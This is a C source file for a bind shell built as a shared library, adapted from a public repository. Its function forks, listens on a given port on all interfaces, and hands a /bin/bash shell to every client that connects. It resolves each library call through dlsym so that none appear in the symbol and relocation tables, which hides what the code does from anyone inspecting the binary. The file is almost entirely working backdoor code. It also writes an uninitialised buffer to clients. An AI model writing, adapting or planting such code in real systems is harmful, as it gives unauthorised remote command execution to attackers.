// Mostly ripped from: https://github.com/deadbits/shells/blob/master/bindshell.c
// Re-adapted by Marco Ortisi (to avoid creations of entries in the symbols and relocations tables
// Compile with:
// gcc testalo_bindshell_mod.c -shared -fpie -o testalo_bindshell_mod.so
#include <stdio.h>
#include <dlfcn.h>
#include <arpa/inet.h>
#include <sys/socket.h>

int testalo(short port)
{
	char msg[512];
	int srv_sockfd, new_sockfd;
	socklen_t new_addrlen;
	struct sockaddr_in srv_addr, new_addr;
	
	/* pointers to function */
	void *handle;
	pid_t (*_fork)(); 
	int (*_socket)(int, int, int);
	int (*_atoi)(char *);
	int (*_bind)(int, struct sockaddr *, socklen_t);
	int (*_listen)(int, int);
	int (*_accept)(int, struct sockaddr *, socklen_t *);
	int (*_close)(int);
	ssize_t (*_write)(int, void *, size_t);
	int (*_dup2)(int, int);
	int (*_execl)(char *, char *, ...);
	short (*_htons)(short);
	uint32_t (*_htonl)(uint32_t);
	void (*_perror)(char *);
	size_t (*_strlen)(char *);

        handle = dlopen (NULL, RTLD_LAZY);
	
	if (!handle) 
		return -1;

	_fork = dlsym(handle, "fork");
	_socket = dlsym(handle, "socket");
	_atoi = dlsym(handle, "atoi");
	_bind = dlsym(handle, "bind");
	_listen = dlsym(handle, "listen");
	_accept = dlsym(handle, "accept");
	_close = dlsym(handle, "close");
	_write = dlsym(handle, "write");
	_dup2 = dlsym(handle, "dup2");	
	_execl = dlsym(handle, "execl");
	_htons = dlsym(handle, "htons");
	_htonl = dlsym(handle, "htonl");
	_perror = dlsym(handle, "perror");
 	_strlen = dlsym(handle, "strlen");
	
       	if ((*_fork)() == 0)
	{
		if((srv_sockfd = (*_socket)(PF_INET, SOCK_STREAM, 0)) < 0)
		{
			(*_perror)("[error] socket() failed!");
			return -1;
		}
		
		srv_addr.sin_family = PF_INET;
		srv_addr.sin_port = (*_htons)(port);
		srv_addr.sin_addr.s_addr = (*_htonl)(INADDR_ANY);
		if((*_bind)(srv_sockfd, (struct sockaddr *)&srv_addr, sizeof(srv_addr)) < 0)
		{
			(*_perror)("[error] bind() failed!");
			return -1;
		}

		if((*_listen)(srv_sockfd, 1) < 0)
		{
			(*_perror)("[error] listen() failed!");
			return -1;
		}

		for(;;)
		{
			new_addrlen = sizeof(new_addr);
			new_sockfd = (*_accept)(srv_sockfd, (struct sockaddr *)&new_addr, &new_addrlen);
			
			if(new_sockfd < 0)
			{
				(*_perror)("[error] accept() failed!");
				return -1;
			}
			
			if((*_fork)() == 0)
			{
				(*_close)(srv_sockfd);
				(*_write)(new_sockfd, msg, (*_strlen)(msg));
				
				(*_dup2)(new_sockfd, 2);
				(*_dup2)(new_sockfd, 1);
				(*_dup2)(new_sockfd, 0);
				
				(*_execl)("/bin/bash", NULL, NULL);
				return 0;
			}
			else
				(*_close)(new_sockfd);
		}
	}
	return 0;
}
